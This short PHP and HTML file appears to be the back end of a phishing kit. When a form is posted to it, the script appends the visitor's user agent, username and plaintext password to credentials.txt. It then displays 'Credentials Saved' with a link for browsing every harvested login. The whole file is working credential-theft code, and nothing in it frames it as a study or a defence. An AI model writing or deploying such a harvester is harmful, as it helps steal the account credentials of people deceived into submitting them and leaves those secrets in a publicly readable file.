<?php
if( isset($_POST["username"]) )
  {
    $useragent = "user agent = {$_SERVER["HTTP_USER_AGENT"]}\n";
    $username  = "username = {$_POST["username"]}\n";
    $password  = "password = {$_POST["password"]}\n";
    
    $text = "{$useragent}{$username}{$password}\n";
    
    $file = fopen("credentials.txt", "a") or die("error while fopen()");
    fwrite($file, $text);
    fclose($file);
  }
?>

<!DOCTYPE html>
<html>
  <head>
    <title>website.here</title>
    <meta charset="UTF-8" />
    <link rel="stylesheet" href="styles.css">
  </head>
  
  <body>
    <p class="pRed">Credentials Saved</p>
    <br>
    <a href="credentials.txt">look at all saved credentials</a>
    <br>
  </body>
</html>
